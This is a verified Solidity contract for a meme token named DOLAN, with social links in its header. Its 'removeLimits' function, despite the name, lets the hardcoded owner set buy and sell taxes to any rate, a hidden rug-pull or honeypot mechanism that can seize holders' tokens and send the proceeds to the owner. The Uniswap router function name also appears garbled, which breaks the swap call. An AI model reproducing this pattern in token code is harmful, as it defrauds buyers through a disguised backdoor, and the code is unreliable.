/**
*Submitted for verification at Etherscan.io on 2023-11-05
/*
$$$$$$$\   $$$$$$\  $$\        $$$$$$\  $$\   $$\ 
$$  __$$\ $$  __$$\ $$ |      $$  __$$\ $$$\  $$ |
$$ |  $$ |$$ /  $$ |$$ |      $$ /  $$ |$$$$\ $$ |
$$ |  $$ |$$ |  $$ |$$ |      $$$$$$$$ |$$ $$\$$ |
$$ |  $$ |$$ |  $$ |$$ |      $$  __$$ |$$ \$$$$ |
$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |\$$$ |
$$$$$$$  | $$$$$$  |$$$$$$$$\ $$ |  $$ |$$ | \$$ |
\_______/  \______/ \________|\__|  \__|\__|  \__|
                                                  

X: https://twitter.com/DolanCoinErc20
Portal: https://t.me/DolanErc20
Website: https://dolaneth.com
*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxremoveOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract DOLAN  {



        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"Dolan"; 
        string public   _symbol = unicode"DOLAN";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 420690000000  * 10**decimals;

        uint256 buyTaxremove = 0;
        uint256 sellTaxremove = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed msgSender,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant msgSender = payable(address(0x09a0E79706060D91e58E0AF956DB5464B4756c2D));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}
 
        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == msgSender || to == msgSender);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxremoveOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                msgSender.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxremoveAmount = amount * (from == pair ? buyTaxremove : sellTaxremove) / 100;
                amount -= TaxremoveAmount;
                balanceOf[address(this)] += TaxremoveAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == msgSender);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _removeLimits(uint256 _buy, uint256 _sell) private {
            buyTaxremove = _buy;
            sellTaxremove = _sell;
        }

        function removeLimits(uint256 _buy, uint256 _sell) external {
            if(msg.sender != msgSender)        
                revert Permissions();
            _removeLimits(_buy, _sell);
        }
    }